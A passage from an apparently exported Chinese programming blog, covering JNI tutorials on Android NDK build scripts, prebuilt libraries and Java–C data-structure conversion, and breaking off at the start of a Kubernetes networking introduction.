<h2 id="4-2-使用第三方库源码"><a href="#4-2-使用第三方库源码" class="headerlink" title="4.2 使用第三方库源码"></a>4.2 使用第三方库源码</h2><p>假设你将第三方库做成动态库，并且你在JNI中还引用了这个动态库，不要企盼着把你的JNI库和这个第三方库放到同一个目录（比如说android项目的<code>libs/armeabi</code>目录）下就万事大吉了，很不幸的告诉你，JNI代码在被运行在android上时不能引用非<code>/system/lib</code>下的动态库。安卓操作系统的系统库文件都是放到<code>/system/lib</code>下的，如果你的JNI代码想引用一些第三方库的功能，就得考虑将第三方库做成静态库，继而打入你生成的jni库中。<br>再假设你就是第三方库的提供方，你需要将你写的代码提供给你的客户，而且你还想在做完库文件后还有一个测试程序，那么你可以在<code>Android.mk</code>中先编译出来一个静态库，然后再编译一个测试用的JNI动态库。你可能会有疑问，同一个<code>Android.mk</code>可以生成多个文件吗，答案是肯定的。<br>还是先看一个官方的例子，在NDK路径下，进入目录<code>sample\two-libs</code>,然后打开<code>jni</code>目录中的<code>Android.mk</code>：</p>
<pre class="line-numbers language-none"><code class="language-none">LOCAL_PATH:&#x3D; $(call my-dir)

# first lib, which will be built statically
#
include $(CLEAR_VARS)

LOCAL_MODULE    :&#x3D; libtwolib-first
LOCAL_SRC_FILES :&#x3D; first.c

include $(BUILD_STATIC_LIBRARY)

# second lib, which will depend on and include the first one
#
include $(CLEAR_VARS)

LOCAL_MODULE    :&#x3D; libtwolib-second
LOCAL_SRC_FILES :&#x3D; second.c

LOCAL_STATIC_LIBRARIES :&#x3D; libtwolib-first

include $(BUILD_SHARED_LIBRARY)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码4.2.1 Android.mk</strong><br>一般情况下，我们都会写<code>include $(BUILD_SHARED_LIBRARY)</code>来生成JNI库，但是这个项目在编译动态库之前先编译生成了一个静态库，编译静态库的时候同样指定了参数<code>LOCAL_MODULE</code>和<code>LOCAL_SRC_FILES</code>参数，但是下面编译动态库的时候也指定了这两个参数啊，难道不冲突？当然不冲突，因为我们用了这句话——<code>include $(CLEAR_VARS)</code>,调用了它就会把之前所有定义的<code>LOCAL_</code>开头的变量全部清空。配置的前半部分生成了静态库<code>libtwolib-first.a</code>，配置的后半部分注意<code>LOCAL_STATIC_LIBRARIES</code>这个变量，其值正是静态库的<code>LOCAL_MODULE</code>名称。  </p>
<h2 id="4-3-使用第三方库文件"><a href="#4-3-使用第三方库文件" class="headerlink" title="4.3 使用第三方库文件"></a>4.3 使用第三方库文件</h2><p>我们在4.2中做出来了一个静态库（那个静态库在项目的<code>obj\local\&#123;abi&#125;</code>目录可以得到，abi为具体的cpu类型），本意是给客户提供一个可以调用的库文件，现在假设你就是那个客户，手里拿到了库文件，但是没有源码，该怎么使用来？这就要提到<code>PREBUILD_</code>类型变量，先看例子：</p>
<pre class="line-numbers language-none"><code class="language-none">LOCAL_PATH:&#x3D; $(call my-dir)

# first lib, which will be built statically
#
include $(CLEAR_VARS)

#$(info $(TARGET_ARCH_ABI))

LOCAL_MODULE :&#x3D; libtwolib-first
LOCAL_SRC_FILES :&#x3D; ..&#x2F;obj&#x2F;local&#x2F;$(TARGET_ARCH_ABI)&#x2F;libtwolib-first.a
include $(PREBUILT_STATIC_LIBRARY)

# second lib, which will depend on and include the first one
#
include $(CLEAR_VARS)

LOCAL_MODULE    :&#x3D; libtwolib-second
LOCAL_SRC_FILES :&#x3D; second.c

LOCAL_STATIC_LIBRARIES :&#x3D; libtwolib-first

include $(BUILD_SHARED_LIBRARY)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>代码 4.3.1 Android-static.mk</strong><br>一般<code>LOCAL_SRC_FILES</code>是要写c&#x2F;c++文件的，现在却直接写了一个动态库文件，然后引入<code>PREBUILT_STATIC_LIBRARY</code>来使用NDK的预编译功能，告诉编译器这个库文件已经编译好了，可以直接在下面的编译的中引用。我们看到最终在编译<code>twolib-second</code>库中，使用变量<code>LOCAL_STATIC_LIBRARIES</code>来将其引入。<br>最后运行<code>ndk-build APP_BUILD_SCRIPT=Android-static.mk</code>进行编译，因为我们这里没有使用默认的mk文件名，所以使用参数<code>APP_BUILD_SCRIPT</code>来指定使用的mk文件。</p>
<h2 id="4-4-指定预编译库的头文件路径"><a href="#4-4-指定预编译库的头文件路径" class="headerlink" title="4.4 指定预编译库的头文件路径"></a>4.4 指定预编译库的头文件路径</h2><p>一些成熟的开源库提供了对于安卓环境的编译支持，你可以使用<code>ndk-build</code>来生成库文件。然后使用4.3的方法引入预编译库，但是对于这种开源库，我们引入头文件都是采用<code>#include&lt;xxx.h&gt;</code>这种方式，这时候就需要指定一个头文件的搜索路径，这就是<code>LOCAL_EXPORT_C_INCLUDES </code>变量的作用。下面是一个引用openssl的例子:</p>
<pre class="line-numbers language-none"><code class="language-none">LOCAL_PATH :&#x3D; $(call my-dir)

include $(CLEAR_VARS)
LOCAL_MODULE :&#x3D; crypto
LOCAL_SRC_FILES :&#x3D; libcrypto.so
LOCAL_EXPORT_C_INCLUDES :&#x3D; $(LOCAL_PATH)&#x2F;include
include $(PREBUILT_SHARED_LIBRARY)

include $(CLEAR_VARS)

LOCAL_MODULE    :&#x3D; libchapter4
#LOCAL_C_INCLUDES :&#x3D; $(SYSROOT)&#x2F;usr&#x2F;include
LOCAL_LDLIBS :&#x3D; -L$(SYSROOT)&#x2F;usr&#x2F;lib -llog

LOCAL_SRC_FILES :&#x3D; chapter4.c

LOCAL_SHARED_LIBRARIES :&#x3D; crypto
include $(BUILD_SHARED_LIBRARY)

TARGET_PLATFORM :&#x3D; android-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里在和<code>chapter4.c</code>同级的目录下，须有有个<code>include</code>文件夹，然后在里面放openssl文件夹，当然这个openssl文件夹里就是一堆openssl的头文件。这样我们在代码中就可以这么写了：<br><code>#include &lt;openssl/pkcs12.h&gt;</code><br>在编译的时候，编译器就会去加载jni目录下的<code>include/openssl/pkcs12.h</code>文件。  </p>
<blockquote>
<p>其实libcrypto.so在安卓系统的<code>/system/lib</code>就存在了，虽然编译完成之后libcrypto.so会被拷贝到安卓项目的libs目录的armeabi下，但是在APP运行时读取的还是<code>/system/lib</code>下的libcrypto.so。可以把libcrypto.so和openssl文件目录分别拷贝到NDK目录下的<code>platforms\android-3\arch-arm\usr</code>中的<code>lib</code>和<code>include</code>目录，这样不需要写<code>include $(PREBUILT_SHARED_LIBRARY)</code>代码块了。</p>
</blockquote>
<pre><code>本文用的代码可以从https://gitlab.com/yunnysunny/ndk/-/tree/master/chapter4 获取。
</code></pre>
]]></content>
      <categories>
        <category>Java</category>
        <category>JNI</category>
      </categories>
  </entry>
  <entry>
    <title>JNI系列教程二——数据结构</title>
    <url>/posts/jni/2-struct-transform/</url>
    <content><![CDATA[<p>JNI和java相互调用，一个不可避免的问题就是两者的数据结构要相互转换。这一节正是要讲这个重头戏。</p>
<blockquote>
<p>本文源地址<a href="http://blog.whyun.com/posts/jni/2-struct-transform/">http://blog.whyun.com/posts/jni/2-struct-transform/</a> 转载请注明出处。</p>
</blockquote>
<h2 id="2-1-基本类型"><a href="#2-1-基本类型" class="headerlink" title="2.1 基本类型"></a>2.1 基本类型</h2><p>基本数据类型大都是数字类型表2.1.1中给出了java和jni的对应关系。</p>
<table>
<thead>
<tr>
<th>Java 类型</th>
<th>本地类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>boolean</td>
<td>jboolean</td>
<td>无符号，8 位</td>
</tr>
<tr>
<td>byte</td>
<td>jbyte</td>
<td>无符号，8 位</td>
</tr>
<tr>
<td>char</td>
<td>jchar</td>
<td>无符号，16 位</td>
</tr>
<tr>
<td>short</td>
<td>jshort</td>
<td>有符号，16 位</td>
</tr>
<tr>
<td>int</td>
<td>jint</td>
<td>有符号，32 位</td>
</tr>
<tr>
<td>long</td>
<td>jlong</td>
<td>有符号，64 位</td>
</tr>
<tr>
<td>float</td>
<td>jfloat</td>
<td>32 位</td>
</tr>
<tr>
<td>double</td>
<td>jdouble</td>
<td>64 位</td>
</tr>
<tr>
<td><strong>表2.1.1 基本数据类型对照表</strong></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="2-2-对象类型"><a href="#2-2-对象类型" class="headerlink" title="2.2 对象类型"></a>2.2 对象类型</h2><p>对象类型的对照关系牵扯到的知识点比较多，所以下面决定通过具体例子来让大家更好的学习它。<br>首先在java代码有这么两行行声明</p>
<pre><code>public native int getSum(int a, int b);
public native int getSum(byte [] array);
</code></pre>
<p>第一个函数是一个基本数据类型，第二个函数是一个数组，虽然两个函数在java中是同名的，但是生成的c文件却不能使用同名文件，</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
 * Class:     com_whyun_jni_chapter2_StructDemo
 * Method:    getSum
 * Signature: (II)I
 */</span>
JNIEXPORT jint JNICALL <span class="token function">Java_com_whyun_jni_chapter2_StructDemo_getSum__II</span>
	<span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jint a<span class="token punctuation">,</span> jint b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">/*
 * Class:     com_whyun_jni_chapter2_StructDemo
 * Method:    getSum
 * Signature: ([B)I
 */</span>
JNIEXPORT jint JNICALL <span class="token function">Java_com_whyun_jni_chapter2_StructDemo_getSum___3B</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jbyteArray arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	  <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	  <span class="token keyword">char</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetByteArrayElements</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>arr<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	  <span class="token keyword">int</span> dataLen <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetArrayLength</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
	  <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>dataLen<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		  sum <span class="token operator">+=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
	  <span class="token punctuation">&#125;</span>
	  <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">ReleaseByteArrayElements</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>arr<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	  <span class="token keyword">return</span> <span class="token punctuation">(</span>jint<span class="token punctuation">)</span>sum<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们通过<code>javah</code>生成头文件时，就会发现生成的getSum的函数后缀是不一样的。这里重点看JNI中对数组的操作，在实际编程中我们常常要处理二进制数据，那么自己数组便是经常要使用的一个数据结构了。java中的byte[]最终在JNI中被转化为jbyteArray，但是jbyteArray要想在C语言中使用，还必须得到一个C语言中可识别的char类型指针的形式，这就是函数GetByteArrayElements的作用。要想知道当前数组的长度，可以使用函数GetArrayLength。我们可以推断出GetByteArrayElements内部申请了一块内存，也就是说变量<code>data</code>是通过类似于malloc之类的函数申请得到的，所以最终在使用完成之后是需要释放的，所以才有了函数最后调用ReleaseByteArrayElements函数的代码。</p>
<p>下面看一个复杂的例子通过JNI来调用java函数,直接上JNI的代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
 * Class:     com_whyun_jni_chapter2_StructDemo
 * Method:    getUserList
 * Signature: (I)Ljava/util/ArrayList;
 */</span>
JNIEXPORT jobject JNICALL <span class="token function">Java_com_whyun_jni_chapter2_StructDemo_getUserList</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jint num<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>num<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
	jclass clsUserBean <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">FindClass</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span><span class="token string">"com/whyun/jni/bean/UserBean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	jclass clsArrayList <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">FindClass</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span><span class="token string">"java/util/ArrayList"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	jmethodID userBeanConstructor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetMethodID</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsUserBean<span class="token punctuation">,</span><span class="token string">"&lt;init>"</span><span class="token punctuation">,</span><span class="token string">"()V"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	jmethodID userBeanSetAge <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetMethodID</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsUserBean<span class="token punctuation">,</span><span class="token string">"setAge"</span><span class="token punctuation">,</span><span class="token string">"(I)V"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	jmethodID userBeanSetName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetMethodID</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsUserBean<span class="token punctuation">,</span><span class="token string">"setName"</span><span class="token punctuation">,</span><span class="token string">"(Ljava/lang/String;)V"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	jmethodID arrayListContructor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetMethodID</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsArrayList<span class="token punctuation">,</span><span class="token string">"&lt;init>"</span><span class="token punctuation">,</span><span class="token string">"(I)V"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	jmethodID arrayListAdd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetMethodID</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsArrayList<span class="token punctuation">,</span><span class="token string">"add"</span><span class="token punctuation">,</span><span class="token string">"(ILjava/lang/Object;)V"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	jobject arrayList <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">NewObject</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsArrayList<span class="token punctuation">,</span>arrayListContructor<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">char</span> nameStr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	jstring name<span class="token punctuation">;</span>

	<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>count<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		jobject userBean <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">NewObject</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>clsUserBean<span class="token punctuation">,</span>userBeanConstructor<span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">for</span> <span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>index<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>index<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			nameStr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> randStr<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">NewStringUTF</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>nameStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">CallVoidMethod</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>userBean<span class="token punctuation">,</span>userBeanSetAge<span class="token punctuation">,</span><span class="token punctuation">(</span>jint<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">CallVoidMethod</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>userBean<span class="token punctuation">,</span>userBeanSetName<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">CallVoidMethod</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>arrayList<span class="token punctuation">,</span>arrayListAdd<span class="token punctuation">,</span><span class="token punctuation">(</span>jint<span class="token punctuation">)</span>i<span class="token punctuation">,</span>userBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> arrayList<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果你稍加揣测的话，这段代码翻译成java代码应该是这么写的：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserBean</span><span class="token punctuation">></span></span> <span class="token function">getUserList</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserBean</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserBean</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>count<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">UserBean</span> bean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bean<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bean<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> list<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看上去java代码要简单许多，在JNI中包括类、成员函数、对象之类的数据都需要先创建再使用。在java中创建对象用<code>new UserBean()</code>就够了，但是在JNI中，你首先要通过<code>FindClass</code>函数来找到类定义，然后通过类定义用函数<code>GetMethodID</code>来找到构造函数，然后根据类定义和构造函数通过函数<code>NewObject</code>来获取一个对象，下面分别对这三个函数进行讲解。<br><code>FindClass</code>函数的第二个参数是要加载的类的类名全称，在java中我们应该写作<code>com.whyun.jni.bean.UserBean</code>,在JNI中就是把<code>.</code>换成了<code>/</code>而已。<br><code>GetMethodID</code>函数的第二个参数是<code>FindClass</code>函数得到的类变量<code>clsUserBean</code>,第二个参数是函数名，一般来说函数名直接写函数名称就行了，比如说你再往下看一行代码获取UserBean的<code>setAge</code>函数的时候就直接写的函数名，但是构造函数就不同了，所有类的构造函数在JNI中统一叫<code>&lt;init&gt;</code>。最后一个参数很重要，它是java函数的签名，java中每个函数和属性都有一个它的标识，这个标识用来指出当前函数的参数、返回值类型或者属性的类名，可能有些人第一听说这个概念，其实获取这个标识有一个很简单的方法，就是命令<code>javap</code>，下面先做个小实验，运行<code>javap -s java.lang.String</code>，会输出如下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">Compiled from &quot;String.java&quot;
public final class java.lang.String implements java.io.Serializable, java.lang.Comparable&lt;java.lang.String&gt;, java.lang.CharSequence &#123;
  public static final java.util.Comparator&lt;java.lang.String&gt; CASE_INSENSITIVE_ORDER;
    Signature: Ljava&#x2F;util&#x2F;Comparator;
  public java.lang.String();
    Signature: ()V

  public java.lang.String(java.lang.String);
    Signature: (Ljava&#x2F;lang&#x2F;String;)V

  public java.lang.String(char[]);
    Signature: ([C)V

  public java.lang.String(char[], int, int);
    Signature: ([CII)V

  public java.lang.String(int[], int, int);
    Signature: ([III)V
由于文件内容比较多，所以省略掉下面内容    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于java是支持重载的，一个函数可能会拥有多种实现方式，比如<code>String</code>类的构造函数就有N多个，那么你在调用其函数的时候，就必须得依靠参数和返回值类型来区分不同的函数了，而签名正提供了一种简介的方式来表示一个函数的参数和返回值。通过刚才<code>javap</code>命令的输出，我们可以得到对于没有参数的String构造函数，其签名为<code>()V</code>；对于参数为字符数组的构造函数签名为<code>([C)V</code>。<br>接着讲函数<code>NewObject</code>,前面经过<code>FindClass</code>和<code>GetMethodID</code>一顿折腾，我们拿到了两个变量类变量<code>clsUserBean</code>和函数变量<code>userBeanConstructor</code>,将其传到<code>NewObject</code>中就能得到一个对象。在我们的代码中还有一个对于ArrayList类型的对象的构造，他调用<code>NewObject</code>的时候比<code>UserBean</code>多了一个参数，那是由于我们使用的构造函数为<code>ArrayList(int i)</code>，故需要传递一个ArrayList的长度参数，这里需要声明的是<code>NewObject</code>函数的参数个数是可变的，调用的构造函数有参数，就依次追加到后面即可。<br>终于讲到真正调用java函数这一步了，就是代码中的<code>CallVoidMethod</code>,和<code>NewObject</code>一样，它也是可变参数，参数形式也一样。除了<code>CallVoidMethod</code>，JNI中还有各种<code>Call[Type]Method</code>，这个Type就代表了java函数的返回值，它可以是<code>Object</code> <code>Boolean</code> <code>Byte</code> <code>Char</code> <code>Short</code> <code>Int</code> <code>Long</code> <code>Float</code> <code>Double</code>。</p>
<h2 id="2-3-使用异常"><a href="#2-3-使用异常" class="headerlink" title="2.3 使用异常"></a>2.3 使用异常</h2><p>c语言中没有异常这个概念，使用c代码的时候多是通过返回码来判断是否调用成功，然而对于java程序来说判断有没有成功，往往是看有没有异常抛出，所以说编写一个java友好的JNI程序，我们需要将错误码转成java异常。直接上例子：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
 * Class:     com_whyun_jni_chapter2_StructDemo
 * Method:    showException
 * Signature: ()V
 */</span>
JNIEXPORT <span class="token keyword">void</span> JNICALL <span class="token function">Java_com_whyun_jni_chapter2_StructDemo_showException</span>
  <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	  jclass exception <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">FindClass</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span><span class="token string">"java/lang/Exception"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	  <span class="token punctuation">(</span><span class="token operator">*</span>env<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">ThrowNew</span><span class="token punctuation">(</span>env<span class="token punctuation">,</span>exception<span class="token punctuation">,</span><span class="token string">"This is a exception."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里ThrowNew转成java的话，就是<code>throw new Exception(&quot;This is a exception.&quot;);</code>其它的我就不多说了。</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>JNI</category>
      </categories>
  </entry>
  <entry>
    <title>k8s 网络原理入门</title>
    <url>/posts/k8s-startup/</url>
    <content><![CDATA[<p>之前通过讲 <a href="https://blog.whyun.com/posts/docker-compose-tutorial/">docker compose 教程</a> 初步了解容器编排技术。但是 docker compose 默认只能在单机模式下运行，如果想在多个宿主机上运行，你可以借助 <a href="https://docs.docker.com/engine/swarm/">docker swarm</a> 技术，你可以方便的将 docker-compose.yml 文件运用到 swarm 集群创建中。不过由于 <a href="https://kubernetes.io/zh/">kubernetes</a> 的出现，swarm 的市场受到了极大排挤，目前各大公司利用容器编排技术，一般都会选择 kubernetes。本文顺应时势，在讲解容器编排技术的时候也是选择了 kubernetes 作为入门教程。本文作为教程的第一章，选择主要讲解的 kubernetes 内部网络原理。</p>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><h3 id="1-1-Linux-下安装"><a href="#1-1-Linux-下安装" class="headerlink" title="1.1 Linux 下安装"></a>1.1 Linux 下安装</h3><p>可以参见这篇文章 <a href="https://blog.ideabeat.cn/2021/11/29/%E4%BD%BF%E7%94%A8kubeadm%E6%90%AD%E5%BB%BAk8s%E9%9B%86%E7%BE%A4-ubuntu-debian%E5%8F%91%E8%A1%8C%E7%89%88/">使用kubeadm搭建k8s集群-ubuntu&#x2F;debian发行版</a> 。</p>
